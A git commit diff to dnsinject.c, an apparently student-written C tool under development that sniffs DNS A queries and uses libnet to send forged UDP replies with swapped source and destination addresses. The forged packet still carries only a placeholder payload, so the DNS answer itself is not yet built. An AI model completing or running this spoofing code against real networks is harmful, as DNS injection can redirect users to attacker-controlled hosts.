152166eabe153fc18eef4409a5767854c5c088ef
Raunak Shah <raunakshah@Raunaks-MacBook-Pro.local>
2017-12-08 11:08:50 -0500

    sending packets minus dns header

--- dnsinject.c
+++ dnsinject.c
@@ -11,6 +11,8 @@
 #include <arpa/inet.h>
 #include <sys/time.h>
 #include <time.h>
+#include <libnet.h>
+#include <stdint.h>
 /* default snap length (maximum bytes per packet to capture) */
 #define SNAP_LEN 1518
 
@@ -18,7 +20,7 @@
 #define SIZE_ETHERNET 14
 
 /* Ethernet addresses are 6 bytes */
-#define ETHER_ADDR_LEN	6
+//#define ETHER_ADDR_LEN	6
 
 /* UDP header is always 8 bytes */
 #define SIZE_UDP 8
@@ -67,7 +69,16 @@ struct sniff_udp{
 
 struct dns_header{
 	u_short id;
-	u_short flags;
+	u_char rd :1; // recursion desired
+    	u_char tc :1; // truncated message
+    	u_char aa :1; // authoritive answer
+    	u_char opcode :4; // purpose of message
+    	u_char qr :1; // query/response flag
+    	u_char rcode :4; // response code
+    	u_char cd :1; // checking disabled
+    	u_char ad :1; // authenticated data
+    	u_char z :1; // its z! reserved
+    	u_char ra :1; // recursion available
 	u_short qdcount;	/* number of entries in question	*/
 	u_short ancount; 	/* number of resource records in answer */
 	u_short nscount; 	/* number of name server resource records in authority records section */
@@ -93,21 +104,32 @@ print_payload(const u_char *payload, int len);
 void
 print_hex_ascii_line(const u_char *payload, int len, int offset);
 
-void dns_head(struct dns_header* dns){
-	int i;
-	u_char *d;
+void dns_head(const struct dns_header* dns){
+	//int i;
+	//u_char *d;
 	//struct dns_header *dns = (struct dns_header*)payload;
 	printf("ID: %d\n", ntohs(dns->id));
-	printf("%d\n", ntohs(dns->flags));
+	//printf("%d\n", ntohs(dns->flags));
+	printf("rd: %02x\n", (dns->rd));
+	printf("tc: %02x\n", (dns->tc));
+	printf("aa: %02x\n", (dns->aa));
+	printf("opcode: %02x\n", (dns->opcode));
+	printf("qr:%02x\n", (dns->qr));
+	printf("rcode: %02x\n", (dns->rcode));
+	printf("cd: %02x\n", (dns->cd));
+	printf("ad: %02x\n", (dns->ad));
+	printf("z: %02x\n", (dns->z));
+	printf("ra: %02x\n", (dns->ra));
+	//	printf("%02x\n", (dns->flags)+1);
 	printf("qd: %d\n", ntohs(dns->qdcount));
 	printf("an: %d\n", ntohs(dns->ancount));
 	printf("ns: %d\n", ntohs(dns->nscount));
 	printf("ar: %d\n", ntohs(dns->arcount));
-//	d = (u_char *)(payload+(sizeof(struct dns_header)));
+	//	d = (u_char *)(payload+(sizeof(struct dns_header)));
 	//printf("name:\n");
 	//printf("%s\n", dns->data);
 	//printf("end\n");
-//	exit(1);
+	//	exit(1);
 }
 
 
@@ -141,19 +163,22 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	/* declare pointers to packet headers */
 	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
 	const struct sniff_ip *ip;              /* The IP header */
-	char * payload;                    /* Packet payload */
+	//char * payload;                    /* Packet payload */
 	const struct sniff_udp *udp;		/* UDP header */
 	const struct dns_header *dnsheader;
 	struct dns_question* dnsquestion;
 	struct dns_question_info* dnsinfo;
 	int size_ip;
-	int size_payload;
-	int size_udp;
-	int len;
-	int source_port;
-	int destination_port;
+	//int size_payload;
+	//int size_udp;
+	//int len;
+	//int source_port;
+	//int destination_port;
 	int qname_len;
 	char *qname;
+	libnet_t *l; /* libnet context */
+	char errbuf[LIBNET_ERRBUF_SIZE];
+
 	/* define ethernet header */
 	ethernet = (struct sniff_ethernet*)(packet);
 
@@ -178,14 +203,15 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 		case IPPROTO_UDP:
 			udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);				
 			dnsheader = (struct dns_header *)(packet + SIZE_ETHERNET + size_ip + SIZE_UDP);
-/*			size_payload = ntohs(ip->ip_len) - (size_ip + SIZE_UDP);
-			if(args!=NULL)
-				if(strstr((char *)(payload),(char *)( args))==NULL)
-					return;
-*/			//printf("Src Port: %d\n", ntohs(udp->src_port));
+			/*			size_payload = ntohs(ip->ip_len) - (size_ip + SIZE_UDP);
+						if(args!=NULL)
+						if(strstr((char *)(payload),(char *)( args))==NULL)
+						return;
+			 */			//printf("Src Port: %d\n", ntohs(udp->src_port));
 			printf("\n%s.%d ", outstr,header->ts.tv_usec);
 			printEthernetHeader(ethernet);
 			printf(" len %d\n", (ntohs(ip->ip_len)+SIZE_ETHERNET));
+			printf(" Ethernet len %d\n", (ntohs(udp->len)));
 			printf("%s:%d -> ", inet_ntoa(ip->ip_src), ntohs(udp->src_port));
 			printf("%s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->dst_port));
 			//printf("Dst Port: %d\n", ntohs(udp->dst_port));					
@@ -199,7 +225,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 					return;
 			printEthernetHeader(ethernet);
 			printf("\n");
-			break;
+			return;break;
 		default:
 			if(args!=NULL)
 				if(strstr((char *)(packet), (char *)(args))==NULL)
@@ -226,9 +252,77 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	dnsinfo = (struct dns_question_info *)(packet + SIZE_ETHERNET + size_ip + SIZE_UDP + 12 + qname_len);
 	printf("qtype: %d\n", ntohs(dnsinfo->qtype));	
 	printf("qclass: %d\n", ntohs(dnsinfo->qclass));	
-	if (ntohs(dnsinfo->qtype) == 1){
-		/* DNS A record */
-		printf("Do your magic");
+	if ((ntohs(dnsinfo->qtype) == 1)){// && (ntohs(dnsheader->flags) == 256)){
+		/* DNS A Query */
+		/* Create new packet */
+		/* Send using sendto() via UDP */
+		char payload[] = "libnet :D";
+		struct sniff_udp *spoofed_udp = (struct sniff_udp*) malloc (sizeof(struct sniff_udp));
+		struct sniff_ip *spoofed_ip = (struct sniff_ip*) malloc (sizeof(struct sniff_ip));
+		struct sniff_ethernet* spoofed_ethernet = (struct sniff_ethernet*) malloc (sizeof(struct sniff_ethernet));	
+		int bytes_written;
+		spoofed_udp->src_port = udp->dst_port;
+		spoofed_udp->dst_port = udp->src_port;
+		spoofed_udp->len = SIZE_UDP + sizeof(payload);
+		spoofed_ip->ip_len = size_ip + IP_HL(ip)*4 + SIZE_UDP + sizeof(payload);
+		spoofed_ip->ip_tos = ip->ip_tos;
+		spoofed_ip->ip_id = ip->ip_id;
+		spoofed_ip->ip_off = ip->ip_off;
+		spoofed_ip->ip_ttl = ip->ip_ttl; 
+		spoofed_ip->ip_p = ip->ip_p;
+		spoofed_ip->ip_src = ip->ip_dst;
+		printf("\nCopied %s into spoof src = %s", inet_ntoa(ip->ip_dst), inet_ntoa(spoofed_ip->ip_src));
+		spoofed_ip->ip_dst = ip->ip_src;
+		printf("\nCopied %s into spoof dst= %s\n", inet_ntoa(ip->ip_src), inet_ntoa(spoofed_ip->ip_dst));
+		//spoofed_ethernet->ether_dhost = ethernet->ether_shost;
+		//spoofed_ethernet->ether_shost = ethernet->ether_dhost;
+		spoofed_ethernet->ether_type = ethernet->ether_type;
+
+		l = libnet_init(LIBNET_LINK, NULL, errbuf); //Need to change NULL to dev	
+		if ( l == NULL ) {
+			fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
+			exit(EXIT_FAILURE);
+		}
+
+		printf("Source port: %d\n", ntohs(spoofed_udp->src_port));
+		printf("Dest port: %d\n", ntohs(spoofed_udp->dst_port));
+		printf("Len: %d\n", spoofed_udp->len);
+		if (libnet_build_udp(spoofed_udp->src_port, spoofed_udp->dst_port, spoofed_udp->len, 0, (u_int8_t*) payload, sizeof(payload), l, 0) == -1){
+			fprintf(stderr, "Error building UDP header: %s\n",libnet_geterror(l));
+			libnet_destroy(l);
+			exit(EXIT_FAILURE);
+		}	
+		
+		printf("Source IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_src));
+		printf("Dest IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_dst));
+		if (libnet_build_ipv4(spoofed_ip->ip_len, spoofed_ip->ip_tos, spoofed_ip->ip_id, spoofed_ip->ip_off, spoofed_ip->ip_ttl, spoofed_ip->ip_p, 0, spoofed_ip->ip_src.s_addr, spoofed_ip->ip_dst.s_addr, NULL, 0, l, 0) == -1){
+			fprintf(stderr, "Error building IP header: %s\n",libnet_geterror(l));
+			libnet_destroy(l);
+			exit(EXIT_FAILURE);
+		}	
+		printf("Source IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_src));
+		printf("Dest IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_dst));
+		if (libnet_build_ethernet(ethernet->ether_shost, ethernet->ether_dhost, spoofed_ethernet->ether_type, NULL, 0, l, 0) == -1){
+			fprintf(stderr, "Error building ethernet header: %s\n",libnet_geterror(l));
+			libnet_destroy(l);
+			exit(EXIT_FAILURE);
+		}
+		printf("writing to port: %d\n", ntohs(spoofed_udp->dst_port));
+		printf("Source IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_src));
+		printf("Dest IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_dst));
+		bytes_written = libnet_write(l);
+		printf("Source IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_src));
+		printf("Dest IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_dst));
+		if ( bytes_written != -1 ){
+			printf("%d bytes written to IP %s with source IP %s.\n", bytes_written, inet_ntoa(spoofed_ip->ip_src), inet_ntoa(spoofed_ip->ip_src));
+			printf("Source IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_src));
+			printf("Dest IP of spoof: %s\n", inet_ntoa(spoofed_ip->ip_dst));
+		}else
+			fprintf(stderr, "Error writing packet: %s\n",\
+					libnet_geterror(l));
+
+		libnet_destroy(l);
+		printf("Dont");
 	}
 
 
